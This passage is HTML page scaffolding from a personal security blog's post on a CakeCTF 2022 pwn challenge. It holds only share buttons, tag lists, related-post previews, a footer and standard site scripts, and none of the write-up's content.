class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CakeCTF-22 Pwn welkerme - EsharkyTheGreat's Personal Blog&url=/posts/CakeCTF-2022-welkerme/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CakeCTF-22 Pwn welkerme - EsharkyTheGreat's Personal Blog&u=/posts/CakeCTF-2022-welkerme/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=CakeCTF-22 Pwn welkerme - EsharkyTheGreat's Personal Blog&url=/posts/CakeCTF-2022-welkerme/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DefCamp-21-Blindsight/">DefCamp-21 Blindsight Writeup</a><li><a href="/posts/pwn-adventure-part3/">PwnAdventure Part3 - Memory and Structs</a><li><a href="/posts/pwn-adventure-part2/">PwnAdventure Part2 - Recon</a><li><a href="/posts/pwn-adventure-part1/">PwnAdventure Part1 - Setup</a><li><a href="/posts/First-Post/">First Test Post</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/game-hacking/">game hacking</a> <a class="post-tag" href="/tags/dlsym/">dlsym</a> <a class="post-tag" href="/tags/ld-preload/">LD_PRELOAD</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/brop/">BROP</a> <a class="post-tag" href="/tags/c/">c++</a> <a class="post-tag" href="/tags/fork/">fork</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/First-Post/"><div class="card-body"> <span class="timeago small" >Dec 27, 2021<i class="unloaded">2021-12-27T19:21:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>First Test Post</h3><div class="text-muted small"><p> Welcome Hello world, this is my first Jekyll blog post. I hope you like it! key: value console.log("Hello World!"); #include&lt;stdio.h&gt; int main() { int a = 5; printf("%d",a); ...</p></div></div></a></div><div class="card"> <a href="/posts/fork-leak-canary/"><div class="card-body"> <span class="timeago small" >Jan 19<i class="unloaded">2022-01-19T10:05:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypass Canary in a Network Forking Service</h3><div class="text-muted small"><p> How to Bypass Stack Canary in a Network Forking Service What is a Stack Canary ? Stack Canary is a mitigation introduced to prevent buffer overflows. It is a random value placed on the stack wh...</p></div></div></a></div><div class="card"> <a href="/posts/pwn-adventure-part1/"><div class="card-body"> <span class="timeago small" >Jan 19<i class="unloaded">2022-01-19T12:02:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PwnAdventure Part1 - Setup</h3><div class="text-muted small"><p> What is this series about ? I recently came across LiverOverflow’s youtube series on PwnAdventure3. I got interested in this because it involves game hacking which I think is very cool. Please ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/DefCamp-21-Blindsight/" class="btn btn-outline-primary" prompt="Older"><p>DefCamp-21 Blindsight Writeup</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/eshwars1210">EsharkyTheGreat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/game-hacking/">game hacking</a> <a class="post-tag" href="/tags/dlsym/">dlsym</a> <a class="post-tag" href="/tags/ld-preload/">LD_PRELOAD</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/brop/">BROP</a> <a class="post-tag" href="/tags/c/">c++</a> <a class="post-tag" href="/tags/fork/">fork</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
